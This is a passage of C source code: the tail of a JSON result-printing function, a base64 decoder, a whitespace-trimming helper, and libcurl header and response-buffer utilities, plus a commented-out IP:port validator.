                    fprintf(stdout, "result type: %s, result data: %s\n", type, data);
                }
            }
            else {
                fprintf(stdout, "couldn't parse result.\n");
            }
            json_decref(result_obj);
        }
        fprintf(stdout, "\n");
    }
    json_decref(res_arr);
    //decode result if it's b64
    return 0;
}

unsigned char *base64_decode(const unsigned char *data, size_t *outbytes, int *error) {
    static const unsigned char decoding_table[256] = {
        [0 ... 255] = 64,
        ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,  ['E'] = 4,  ['F'] = 5,
        ['G'] = 6,  ['H'] = 7,  ['I'] = 8,  ['J'] = 9,  ['K'] = 10, ['L'] = 11,
        ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15, ['Q'] = 16, ['R'] = 17,
        ['S'] = 18, ['T'] = 19, ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
        ['Y'] = 24, ['Z'] = 25,
        ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29, ['e'] = 30, ['f'] = 31,
        ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35, ['k'] = 36, ['l'] = 37,
        ['m'] = 38, ['n'] = 39, ['o'] = 40, ['p'] = 41, ['q'] = 42, ['r'] = 43,
        ['s'] = 44, ['t'] = 45, ['u'] = 46, ['v'] = 47, ['w'] = 48, ['x'] = 49,
        ['y'] = 50, ['z'] = 51,
        ['0'] = 52, ['1'] = 53, ['2'] = 54, ['3'] = 55, ['4'] = 56,
        ['5'] = 57, ['6'] = 58, ['7'] = 59, ['8'] = 60, ['9'] = 61,
        ['+'] = 62,
        ['/'] = 63
    };
    size_t inbytes = strlen((const char *)data);
    if (inbytes == 0) {
        *error = 0;
        return (void *)NULL;
    }
    *outbytes = (inbytes/4) * 3;
    if (data[inbytes - 1] == '=')
        (*outbytes)--;
    if (data[inbytes - 2] == '=')
        (*outbytes)--;
    unsigned char *output = malloc(*outbytes);
    if (!output) {
        perror("malloc");
        *error = -1;
        return (void *)NULL;
    }
    unsigned char *p = output;
    for (size_t i = 0; i + 3 < inbytes - 4; i += 4) { //decode upto the last 4 bytes
        *p++ = (decoding_table[data[i]] << 2) | (decoding_table[data[i + 1]] >> 4);
        *p++ = (decoding_table[data[i + 1]] << 4) | (decoding_table[data[i + 2]] >> 2);
        *p++ = (decoding_table[data[i + 2]] << 6) | (decoding_table[data[i + 3]]);
    } //p is pointing at the first of the last four bytes
    size_t i = inbytes - 4;
    if (data[inbytes - 1] == '=' && data[inbytes - 2] == '=') {
        *p = (decoding_table[data[i]] << 2) | (decoding_table[data[i + 1]] >> 4);
    }
    else if (data[inbytes - 1] == '='){
        *p++ = (decoding_table[data[i]] << 2) | (decoding_table[data[i + 1]] >> 4);
        *p = (decoding_table[data[i + 1]] << 4) | (decoding_table[data[i + 2]] >> 2);
    }
    else {
        *p++ = (decoding_table[data[i]] << 2) | (decoding_table[data[i + 1]] >> 4);
        *p++ = (decoding_table[data[i + 1]] << 4) | (decoding_table[data[i + 2]] >> 2);
        *p = (decoding_table[data[i + 2]] << 6) | (decoding_table[data[i + 3]]);
    }
    return output;
}

static inline void trim_spaces(char **buf) {
    char *start = *buf;
    size_t len = strlen(start);
    if (len == 0)
        return; //empty
    char *end = start + len -1; //character before null byte

    while (end >= start && (*end == ' ' || *end ==  '\n' || *end == '\t')) {
        end--;
    }
    //all spaces means that now end < start
    if (end < start) {
        **buf = '\0';
        return;
    }
    *(end + 1) = '\0'; //null byte where the last space was

    while (*start == ' ' || *start == '\n' || *start == '\t') {
        start++;
    }
    *buf = start;
}

int set_http_headers(struct curl_slist **slist_ptr, int argc, ...) {
    struct curl_slist *headers = *slist_ptr;
    va_list args;
    va_start(args, argc);
    for (int i = 0; i < argc; i++) {
        const char *str = va_arg(args, const char *);
        struct curl_slist *temp = NULL;
        temp = curl_slist_append(headers, str);
        if (!temp) {
            curl_slist_free_all(headers);
            va_end(args);
            return -1;
        }
        headers = temp;
    }
    va_end(args);
    *slist_ptr = headers;
    return 0; //success
}

size_t write_cb(char *data, size_t size, size_t nmemb, void *buf) {
    size_t realsize = size * nmemb;
    struct response_buf *mem = (struct response_buf *)buf;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if(!ptr)
        return 0;  //out of memory

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), data, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

/* using curl, no need
int is_valid_ip_port(char *start) {
    long octet, port;
    char *p = start;
    for (int i = 0; i < 4; i++) {
        octet = strtol(p, &p, 10);
        if (p == start)
        {
            return 0; //nothing parsed from the string
        }
        if (octet < 0 || octet > 255) {
            return 0; //out of range
        }
        switch (*p) {
            case '.':
                p++;
                start = p;
                continue;
            case ':':
                p++;
                start = p;
                switch (i) {
                    case 3:
                        goto endloop;;
                    default:
                        return 0; //there must be three dots
                }
            default:
                return 0; //invalid input
        }
    }
    endloop:
    port = strtol(p, &p, 10);
    if (p == start)
    {
        return 0; //nothing parsed from the string
    }
    if (port < 1 || port > 65535) {
        return 0; //out of range
    }
    for (; *p != '\0' && *p != '\n'; p++) {
        if (*p == ' ')
            continue;
        else
            return 0;
    }
    return 1;
}
*/